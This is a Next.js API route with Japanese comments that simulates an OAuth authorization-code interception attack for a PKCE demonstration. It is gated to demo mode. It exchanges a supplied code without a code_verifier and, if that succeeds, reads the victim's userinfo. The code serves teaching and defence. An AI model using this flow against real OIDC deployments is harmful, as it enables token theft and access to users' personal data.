import { NextRequest, NextResponse } from "next/server";
import { isDemoMode } from "@/lib/env";
import { getEnv } from "@/lib/env";

export const runtime = "nodejs";

/**
 * POST /api/demo/steal-code — 認可コード横取り攻撃のシミュレーション
 * 認可コードを受け取り、code_verifier なしで OP のトークンエンドポイントにリクエストする。
 * PKCE が無効なら成功し、有効なら invalid_grant で失敗する。
 */
export async function POST(request: NextRequest) {
  if (!isDemoMode()) {
    return NextResponse.json({ error: "demo mode is disabled" }, { status: 404 });
  }

  const body = await request.json();
  const code = body.code;
  if (!code || typeof code !== "string") {
    return NextResponse.json({ error: "code is required" }, { status: 400 });
  }

  const env = getEnv();
  const opBaseUrl = env.oidc.issuerInternal;

  // OP の Discovery エンドポイントからトークンエンドポイントを取得
  const discoveryRes = await fetch(
    `${opBaseUrl}/${env.oidc.tenantCode}/.well-known/openid-configuration`,
  );
  if (!discoveryRes.ok) {
    return NextResponse.json({ error: "failed to fetch discovery" }, { status: 500 });
  }
  const discovery = await discoveryRes.json();
  // コンテナ間通信用に token_endpoint の URL を書き換え
  const tokenEndpoint = (discovery.token_endpoint as string).replace(
    env.oidc.issuer,
    opBaseUrl,
  );

  // 攻撃者として: code_verifier なしでトークンリクエスト
  const tokenRes = await fetch(tokenEndpoint, {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      grant_type: "authorization_code",
      code,
      redirect_uri: env.oidc.redirectUri,
      client_id: env.oidc.clientId,
      client_secret: env.oidc.clientSecret,
      // code_verifier は意図的に含めない（攻撃者は知らない）
    }),
  });

  const tokenData = await tokenRes.json();

  if (!tokenRes.ok) {
    // PKCE 有効時は invalid_grant で拒否される
    return NextResponse.json({
      success: false,
      error: tokenData.error ?? "token_request_failed",
      error_description: tokenData.error_description ?? "トークンリクエストが拒否されました",
    });
  }

  // トークン取得成功 → UserInfo で被害者情報を取得
  const accessToken = tokenData.access_token;
  const userinfoEndpoint = (discovery.userinfo_endpoint as string).replace(
    env.oidc.issuer,
    opBaseUrl,
  );

  const userinfoRes = await fetch(userinfoEndpoint, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });

  let userinfo = null;
  if (userinfoRes.ok) {
    userinfo = await userinfoRes.json();
  }

  return NextResponse.json({
    success: true,
    userinfo,
    message: "攻撃者は code_verifier なしでトークンを取得できました",
  });
}
